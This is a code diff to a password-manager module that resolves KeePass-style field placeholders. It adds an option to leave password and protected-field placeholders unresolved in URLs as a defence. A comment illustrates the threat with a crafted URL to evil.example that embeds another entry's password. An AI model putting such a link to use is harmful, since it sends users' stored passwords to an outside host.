@@ -50,28 +50,37 @@ export const uuidHex = (uuid) => [...atob(String(uuid))].map((c) => c.charCodeAt
  * - {TITLE} {USERNAME} {PASSWORD} {URL} {NOTES} und {S:Name} (eigenes Feld): aus `entry` selbst.
  * - {URL:RMVSCM} {URL:SCM} {URL:HOST} {URL:PORT} {URL:PATH} {URL:QUERY} {URL:USERINFO} {URL:USERNAME} {URL:PASSWORD}: Teile der eigenen URL.
  * Gross-/Kleinschreibung der Namen egal. Was sich nicht aufloesen laesst, bleibt stehen. Ohne entry gelten nur die {REF:…}.
+ *
+ * secrets: false laesst Platzhalter stehen, die ein Geheimnis einsetzen wuerden (das Passwort oder ein geschuetztes Feld, auch ueber
+ * {REF:P@…} aus einem anderen Eintrag). Fuer alles, was eine Adresse anzeigt, verlinkt, oeffnet oder kopiert: Ein importierter oder
+ * zusammengefuehrter Eintrag mit der URL "https://evil.example/?p={REF:P@T:}" wuerde sonst einen Link mit fremdem Passwort ergeben.
  */
-export function resolvePlaceholders(text, entry, entries, depth = 0) {
+export function resolvePlaceholders(text, entry, entries, { secrets = true } = {}) {
+    return resolve(text, entry, entries, secrets, 0);
+}
+/** Passwort oder geschuetztes Feld (ProtectedValue; ungeschuetzte Felder sind Strings). */
+const isSecretField = (e, name) => name === 'Password' || (e.fields.get(name) != null && typeof e.fields.get(name) !== 'string');
+function resolve(text, entry, entries, secrets, depth) {
     if (!text.includes('{') || depth >= 10) return text;
-    const own = (name) => resolvePlaceholders(fieldOf(entry, name), entry, entries, depth + 1);
+    const field = (e, name, all) => (!secrets && isSecretField(e, name) ? all : resolve(fieldOf(e, name), e, entries, secrets, depth + 1));
     return text.replace(/\{([^{}]+)\}/g, (all, inner) => {
         const ref = /^REF:([TUPANI])@([TUPANIO]):(.*)$/i.exec(inner);
         if (ref) {
             const hit = findRefTarget(entries, ref[2].toUpperCase(), ref[3]);
             if (!hit) return all;
             const want = ref[1].toUpperCase();
-            return want === 'I' ? uuidHex(hit.uuid) : resolvePlaceholders(fieldOf(hit, REF_FIELDS[want]), hit, entries, depth + 1);
+            return want === 'I' ? uuidHex(hit.uuid) : field(hit, REF_FIELDS[want], all);
         }
         if (!entry) return all;
         const key = inner.toUpperCase();
-        if (OWN_FIELDS[key]) return own(OWN_FIELDS[key]);
+        if (OWN_FIELDS[key]) return field(entry, OWN_FIELDS[key], all);
         if (key.startsWith('S:')) {
             const name = inner.slice(2), lower = name.toLowerCase();
             const hit = entry.fields.has(name) ? name : [...entry.fields.keys()].find((k) => k.toLowerCase() === lower);
-            return hit === undefined ? all : own(hit);
+            return hit === undefined ? all : field(entry, hit, all);
         }
         if (key.startsWith('URL:')) {
-            const part = urlPart(own('URL'), key.slice(4));
+            const part = urlPart(field(entry, 'URL', ''), key.slice(4));
             return part === null ? all : part;
         }
         return all;
